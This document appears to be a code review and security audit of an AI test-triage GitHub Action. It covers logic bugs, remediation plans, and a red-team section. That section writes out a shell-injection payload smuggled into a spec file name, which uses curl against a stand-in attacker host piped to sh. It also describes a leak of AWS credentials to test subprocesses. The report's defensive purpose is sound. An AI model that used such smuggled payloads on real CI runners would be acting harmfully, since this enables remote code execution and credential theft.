# Comprehensive Code Review & Security Analysis: adept-triage-agent
**Date:** May 20, 2026  
**Status:** Completed  
**Repository:** `Adept/adept-triage-agent`

---

## Executive Summary

The `adept-triage-agent` is a production-ready, highly sophisticated GitHub Action engineered to triage test failures, classify root causes, and autonomously apply code fixes with layered verification gates. 

While the system showcases an exceptional degree of engineering maturity, a deep-dive review across the entire codebase and its most recent release (`v1.52.14` / `dcf602c`) has exposed critical logical bugs, security vulnerabilities, and cognitive optimization gaps. This document aggregates all codebase-wide, release-specific, and subagent findings into a single source of truth for engineering remediation.

---

## 1. High-Level Architecture & Component Analysis

The triage agent is designed around a single-entry pipeline constructed to minimize LLM latency, prevent execution side-effects, and isolate unsafe subprocess operations.

```
[GitHub Action Trigger]
       │
       ▼
[index.ts] (Action input parser & bootstrap)
       │
       ▼
[PipelineCoordinator] (Pipeline orchestrator)
       │
       ├─► [Heuristic Fast-Path] (Infrastructure short-circuit; skips LLM)
       │
       ├─► [OpenAI Classifier] (First-pass categorization & confidence check)
       │
       ├─► [Policy Gates] (Non-Fixable & Chronic Flakiness short-circuits)
       │
       ▼
[AgentOrchestrator] (Multi-agent delegation loop)
       │
       ├─► [AnalysisAgent] (Root cause analysis & selector extraction)
       ├─► [CodeReadingAgent] (Deterministic repo-relative source retrieval)
       ├─► [InvestigationAgent] (Verdict validation & evidence gathering)
       └─► [FixGen & Review Loop] ◄─── (Iterative feedback loop)
                 │
                 ▼
[LocalFixValidator] (Sandbox environment)
       │
       ├─► [Baseline Check] (Confirm failure is reproducible; runs 3x)
       ├─► [Apply & Compile] (TypeScript type-check sandbox)
       ├─► [Test Execution] (Subprocess test runner with env isolation)
       ├─► [PR Publisher] (Pushes branch and creates draft pull request)
       └─► [SkillStore] (DynamoDB outcomes & recency-weighted memory caching)
```

### Architectural Strengths
* **Stateless Cognitive Orchestration:** `AgentOrchestrator` acts purely as a cognitive router, delegating to stateless sub-agents and compiling outputs. The actual sandbox, cloning, testing, and Git operations are encapsulated entirely inside `LocalFixValidator` and `PipelineCoordinator`, preserving a clean separation of concerns.
* **Multimodal Gating:** Screenshots are attached to payloads only for the `AnalysisAgent` and `InvestigationAgent` stages. Once the investigation concludes, `context.includeScreenshots` is toggled to `false`, preventing downstream `FixGenerationAgent` and `ReviewAgent` runs from wasting vision tokens.
* **Deterministic Tree Probing:** Rather than using LLMs to navigate the repository, the `CodeReadingAgent` uses `git.getTree` with `recursive: 'true'` to build an in-memory map of the repo. This replaces multiple sequential, high-latency `getContent` API calls with a single network request.

---

## 2. Release-Specific Code Review (v1.52.14 / dcf602c)

Commit `dcf602c` ("feat(repair): audit-driven fixes from last-5-runs analysis") represents a highly tactical, high-impact update driven by an internal operational audit (`docs/audit-last-5-runs.md`). 

### Enhancements Evaluated:
1. **Fix-Gen "Symptom vs. Root Cause" Prompt:** The introduction of Buckets A, B, and C successfully instructs the LLM that "a null-check inside a polling helper does not fix bucket B; it only converts a TypeError into a silent timeout." This directly mitigates a common class of low-quality agentic modifications.
2. **Hook-Strictness Symmetry (CRITICAL):** Enforcing that setup/before-hook tightening is accompanied by symmetric allow-list/cleanup handling in teardown/after-hooks is a highly sophisticated approach to regression prevention.
3. **Semantic Blast-Radius Boosts:** The `requiredConfidence` scoring now properly evaluates the *nature* of changes (e.g., adding large global timeouts $\ge 30\text{s}$ or modifying shared helpers to throw rather than swallow errors) instead of relying solely on touched file counts.
4. **Per-Recent-Failed-Trajectory Penalty:** The lookups via `countRecentFailedTrajectories` successfully prevent the agent from immediately re-applying a failed fix configuration at marginal confidence.
5. **Draft Pull Requests:** Auto-generating a draft PR on the remote-validation path ensures that branches are immediately visible and not left orphaned.
6. **Infrastructure Fast-Path:** The `detectInfrastructureFailure` utility recognizes remote WebDriver session creation timeouts (e.g., Sauce Labs provisioning failures) and short-circuits directly to `INCONCLUSIVE`, saving ~30 seconds and thousands of tokens per occurrence.

---

## 3. Subagent Findings & Critical Logical Bugs

Our deep-dive review identified nine new logical and structural bugs that threaten the stability, correctness, and cost-efficiency of the pipeline.

### [CRITICAL] 1. Silent Code Deletion in `LocalFixValidator` Fuzzy Matching (Strategy 3 Fallback)
* **Location:** `src/services/local-fix-validator.ts` — `autoCorrectOldCode`
* **Root Cause:** When Strategy 3 matches an approximate old code block fuzzy-style via surrounding keywords, it assigns the entire context-padded block (including 3 lines of preceding context and 2 lines of succeeding context) to `change.oldCode`:
  ```typescript
  1176| change.oldCode = region;
  ```
  However, `change.newCode` is **not** updated to include those same 5 surrounding context lines. When `LocalFixValidator.applyFix()` later executes, it performs a simple string replace of `change.oldCode` (the 5-line-padded `region`) with the original un-padded `change.newCode`.
* **Impact:** **CRITICAL**. This silently **deletes the 3 preceding lines and 2 succeeding lines** of code surrounding the fix target in the test file, corrupting unrelated test logic and breaking compilation.
* **Remediation:** Do not include surrounding padding lines in `change.oldCode`, or update `change.newCode` to include the identical padded lines.

### [HIGH] 2. Fuzzy Auto-Correction Fails on Code Blocks with Legitimate Empty Lines
* **Location:** `src/services/local-fix-validator.ts` — `extractMatchingRegion`
* **Root Cause:** The `extractMatchingRegion` function parses `approxOldCode` and filters out empty lines to produce `oldLines`:
  ```typescript
  1205| const oldLines = approxOldCode.split('\n').map((l) => l.trim()).filter(Boolean);
  ```
  It then matches them consecutively against `sourceLines` using `i + j` offsets. If the source file contains legitimate empty lines in that region, `sourceLines[i + j]` will be `""`, which will fail to match `oldLines[j]` (the next non-empty code line). Furthermore, the resulting slice `sourceLines.slice(i, i + oldLines.length)` will be too short because it excludes empty lines, mismatching the file content.
* **Impact:** Totally disables fuzzy old-code matching for any multi-line code block containing blank lines, leading to false rejections during local validation.
* **Remediation:** Do not filter out empty lines during index matching, or skip empty lines in `sourceLines` dynamically during the `j` loop traversal.

### [HIGH] 3. Binary Decode Blind Spot in Validation Log Downloads
* **Location:** `src/repair/fix-applier.ts` — `getValidationFailureLogs`
* **Root Cause:** When calling `octokit.actions.downloadJobLogsForWorkflowRun()`, GitHub returns the raw logs as an `ArrayBuffer` or `Buffer`. The code attempts to cast the payload to a string using JavaScript's native string coercion:
  ```typescript
  1007| const rawLogs =
  1008| typeof logsResponse.data === 'string'
  1009| ? logsResponse.data
  1010| : String(logsResponse.data);
  ```
  Under JavaScript coercion rules, calling `String()` on an `ArrayBuffer` evaluates to the literal string `"[object ArrayBuffer]"` instead of decoding the binary UTF-8 stream.
* **Impact:** The agent is completely blinded to validation failure logs on remote validation runs, rendering all log processing and error-signature extraction useless.
* **Remediation:** Safely decode the `ArrayBuffer` using a `TextDecoder` or NodeJS `Buffer.from(logsResponse.data).toString('utf-8')`.

### [HIGH] 4. Apples-to-Oranges Confidence Comparison in Verdict Override
* **Location:** `src/agents/agent-orchestrator.ts` — `runPipeline`
* **Root Cause:** When evaluating a verdict override, the orchestrator checks:
  ```typescript
  if (investigation.verdictOverride &&
      investigation.verdictOverride.suggestedLocation === 'APP_CODE' &&
      investigation.verdictOverride.confidence >= analysis.confidence) { ... }
  ```
  Here, `analysis.confidence` is the confidence score of the `AnalysisAgent` in its **root cause category** (e.g., selector mismatch vs. timing issue). However, `investigation.verdictOverride.confidence` is the confidence of the `InvestigationAgent` in its **defect location** (how sure it is that the bug belongs to product-side `APP_CODE`).
* **Impact:** If `AnalysisAgent` is 95% confident that the symptom is a missing selector (a highly obvious symptom), but `InvestigationAgent` runs a deep code trace and discovers a product-side bug (90% confident it's an app regression), the override is **rejected** because `90 < 95`. The agent will proceed to generate and apply a test-side fix, papering over a real product defect.
* **Remediation:** Compare the override confidence directly against the initial classifier's triage confidence, or abort immediately if the override confidence exceeds a safe static threshold (e.g., `>70%`).

### [MEDIUM-HIGH] 5. Unvalidated LLM Response Fields can Crash the Action
* **Location:** `src/openai-client.ts` — `validateResponse()`, and `src/pipeline/output.ts` — `setSuccessOutput()`
* **Root Cause:** The `validateResponse()` function only validates that `verdict`, `reasoning`, and `indicators` are of the expected types. It completely bypasses validation of the `suggestedSourceLocations` field. If the LLM returns `suggestedSourceLocations` as a malformed object or a non-array, downstream code will crash:
  ```typescript
  375| result.suggestedSourceLocations.forEach((location, index) => {
  ```
  This immediately throws a `TypeError: result.suggestedSourceLocations.forEach is not a function`.
* **Impact:** A malformed response from the model on a `PRODUCT_ISSUE` verdict will crash the GHA execution rather than failing gracefully.
* **Remediation:** Validate the type of `suggestedSourceLocations` inside `validateResponse()` and force it to `[]` if invalid.

### [MEDIUM] 6. Unrelated Skill Leak in Classifier Retrieval
* **Location:** `src/services/skill-store.ts` — `findForClassifier`
* **Root Cause:** In `findForClassifier`, candidates are scored based on spec matching and error similarity. A `+3` recency boost is applied if the skill was used within the last 7 days:
  ```typescript
  if (now - parseSkillTimestamp(skill.lastUsedAt) < SEVEN_DAYS) score += 3;
  ```
  If a candidate skill belongs to a **completely different spec** (`score +0`) and has **zero error similarity** (`score +0`), its total score is still `3`. Because the result is filtered via `score > 0`, it passes the filter and can be returned in the top-3 "relevant" skills.
* **Impact:** The classifier is fed completely unrelated skills simply because they are fresh in the database. This causes severe anchoring bias, presenting wrong patterns as "contextual evidence" to the model.
* **Remediation:** Only apply the recency boost to skills that already have a non-zero matching base-score.

### [MEDIUM] 7. Clock-Skew Vulnerability in Remote Validation Run Selection
* **Location:** `src/repair/fix-applier.ts` — `triggerValidation`
* **Root Cause:** The time-window fallback matching of workflow runs compares the workflow's `created_at` timestamp with the runner's `dispatchedAt` time:
  ```typescript
  776| const fallback = candidates.find((run) => {
  777| const createdAt = new Date(run.created_at);
  778| return createdAt >= new Date(dispatchedAt.getTime() - 30_000);
  779| });
  ```
  It assumes that GHA runners and GitHub's API servers have synchronized clocks within a strict 30-second window.
* **Impact:** If a self-hosted runner experiences clock drift of more than 30 seconds, the check will return `false`, causing the agent to orphan the validation run, skip remote polling, and mark the fix as validation-skipped.
* **Remediation:** Increase the time boundary to a wider, safer window (e.g., `- 120_000` or `- 300_000` ms).

### [MEDIUM] 8. Fragile Coupling and Magic Strings in Critical Review Blocks
* **Location:** `src/agents/agent-orchestrator.ts` — `isBlockingCriticalIssue`
* **Root Cause:** The orchestrator determines if a Review Agent's feedback blocks a fix from being shipped based on fuzzy string matching on the issue description:
  ```typescript
  1018| d.includes('failure mode trace') ||
  1019| d.includes('causal trace') ||
  1020| d.includes('strictly stronger')
  ```
  This introduces a brittle, implicit dependency on the specific English words formulated by the LLM. 
* **Impact:** If the Review Agent's system prompt is altered or the model describes the critical block slightly differently, `isBlockingCriticalIssue` will fail, and the orchestrator will bypass the safety gate and ship the rejected fix.
* **Remediation:** Standardize the Review Agent's response schema to emit a structured, enum-based category identifier (e.g., `blockingCategory: 'MISSING_TRACE' | 'NOT_STRONGER'`), rather than scraping raw text.

### [LOW] 9. Jaccard Similarity Inflation on Empty Error Normalizations
* **Location:** `src/services/skill-store.ts` — `errorSimilarity`
* **Root Cause:** The `errorSimilarity` function computes token overlap by splitting strings on whitespace:
  ```typescript
  1153| const tokensA = new Set(a.toLowerCase().split(/\s+/));
  ```
  If both error messages are blank or normalize to empty strings, `split(/\s+/)` returns an array containing a single empty string element `[""]`. The sets `tokensA` and `tokensB` will both have a size of 1 containing the token `""`. This bypasses the size checks and evaluates to a Jaccard index of `1.0`.
* **Impact:** Unparsed error logs or blank failure messages will register as a perfect 1.0 match, causing unrelated blank errors to match curated `nonFixable` seeds or surface unrelated learned skills.
* **Remediation:** Filter out empty strings after splitting tokens: `split(/\s+/).filter(Boolean)`.

---

## 4. Red Team Security Analysis

Our security spot check evaluated potential injection, leakage, and resource exhaustion vectors.

### [HIGH] 1. Shell Command Injection in Local Test Validation via extracted `fileName`
* **Location:** `src/services/local-fix-validator.ts` — `runTest()`, and `src/simplified-analyzer.ts` — `extractErrorFromLogs()`
* **Vulnerability:** When local validation is enabled (`ENABLE_LOCAL_VALIDATION=true`), the triage agent attempts to run test commands using `execSync` with parameter replacement. If a custom validation spec is not provided, the agent falls back to using the file name parsed from the test logs (`errorData.fileName`). In `simplified-analyzer.ts`, `fileName` is extracted via regex:
  ```typescript
  /(?:Running:|File:|spec:)\s*([^\s]+\.[jt]sx?)/
  ```
  Any sequence of non-whitespace characters ending in `.js`/`.ts`/`.jsx`/`.tsx` is successfully matched. This sequence can easily contain shell metacharacters such as `;`, `&`, `|`, `$()`, or `` ` ``. In `local-fix-validator.ts`, this extracted `spec` is directly substituted into the test command template via `replaceAll('{spec}', this.config.spec)` and executed through `execSync(cmd)`, which spawns a system shell.
* **Concrete Exploit Path:**
  An attacker can submit a pull request containing a test designed to fail and output a crafted string to `stdout` / `stderr`. For example, the test execution might print:
  ```
  spec: test/specs/auth.ts;curl attacker.com/exploit|sh;test.ts
  ```
  1. The triage agent's `extractErrorFromLogs` parses the logs, matches the pattern, and extracts `test/specs/auth.ts;curl attacker.com/exploit|sh;test.ts` as `errorData.fileName`.
  2. This filename is passed to the local validator as `this.config.spec`.
  3. When `validator.runTest()` runs, it substitutes `{spec}` inside the configured `testCommand` to:
  ```bash
  npx wdio run wdio.conf.ts --spec test/specs/auth.ts;curl attacker.com/exploit|sh;test.ts
  ```
  4. `execSync` executes this via the shell, which triggers and runs the injected shell command (`curl attacker.com/exploit|sh`), leading to arbitrary code execution within the GitHub Actions runner.
* **Remediation:** Validate that `this.config.spec` is a safe path (e.g., strictly conforming to a regex of allowed characters like `^[a-zA-Z0-9_\-\.\/]+$`), or verify that the resolved file actually exists within the repository root before executing any shell commands.

### [MEDIUM] 2. Exposing Sensitive AWS Credentials to Local Test Subprocesses
* **Location:** `src/services/local-fix-validator.ts` — `filterEnv()`
* **Vulnerability:** The triage agent filters environment variables using `filterEnv()` to prevent leaking sensitive secrets to test runs. However, the `SECRET_ENV_KEYS` set only blocks standard tokens (such as `GITHUB_TOKEN`, `OPENAI_API_KEY`, `NPM_TOKEN`, etc.). When the agent is configured to use the DynamoDB backend for its skill store, AWS authentication credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`) are left in the environment and forwarded directly to the test execution subprocess.
* **Risk:** LLM-generated fixes or compromised dependencies in the codebase running inside the test subprocess can easily read and exfiltrate these AWS credentials.
* **Remediation:** Add AWS-specific environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, and `AWS_DEFAULT_REGION`) to the `SECRET_ENV_KEYS` denylist inside `local-fix-validator.ts`.

### [MEDIUM] 3. Resource Exhaustion via Unbounded Skill Loading from DynamoDB
* **Location:** `src/services/skill-store.ts` — `load()`
* **Vulnerability:** The `load()` function retrieves skills for a given repository by executing paginated query commands to DynamoDB under the partition key `REPO#<owner>/<repo>`. Under the manual-skill-lifecycle refactor, the agent does not automatically prune or retire old skills. Consequently, skills will accumulate indefinitely under this single partition key.
* **Risk:** As the repository accumulates hundreds or thousands of skills over time, paginating and loading the entire partition on every single run will result in high latency, significant AWS costs, excessive runner memory consumption, and potential timeout or out-of-memory (OOM) crashes.
* **Remediation:** Introduce a hard limit or pagination cap on skill retrieval (e.g., loading only the N most recent/relevant skills) rather than executing an unbounded `do-while` loop that fetches the entire partition.

---

## 5. Strategic Recommendations & Action Plan

To transition the triage agent to its next level of engineering maturity, we recommend scheduling the following work items:

### Phase 1: High-Priority Security & Critical Bug Fixes
* **Fix the Strategy 3 Context Padding Bug:** Ensure `change.newCode` incorporates the identical context padding used in `change.oldCode` before calling string replacement.
* **Sanitize `fileName` Logs Extraction:** Apply strict pathspec formatting and existence validation on extracted spec file names to completely close the shell injection vector in `LocalFixValidator`.
* **AWS Secret Masking:** Add AWS-specific credentials keys to the environment filter list to isolate DynamoDB access keys from test executions.
* **Safely Decode Log Buffers:** Implement binary-safe UTF-8 decoding for `octokit.actions.downloadJobLogsForWorkflowRun` responses.

### Phase 2: Orchestration & Session Optimization
* **Establish Three-Tier Model Selection:**
  1. **Tier 1 (Triage & Categorization):** Use a fast, non-reasoning model (e.g. `gpt-4o` or `gpt-5.5` with `reasoningEffort: 'none'`) for the initial triage classifier and `AnalysisAgent`.
  2. **Tier 2 (Logic Cross-Referencing):** Use `gpt-5.5` with `low` or `medium` reasoning for the `InvestigationAgent`.
  3. **Tier 3 (Synthesis & Code Gen):** Reserve `gpt-5.5` with `xhigh` reasoning exclusively for `FixGenerationAgent` and `ReviewAgent`.
* **Fresh Sessions for Iterative Retries:** Sever the `fixReviewChainId` previous-response dependency in `AgentOrchestrator`. Let each retry run in a clean, stateless prompt session to eliminate exponential input token carryover.
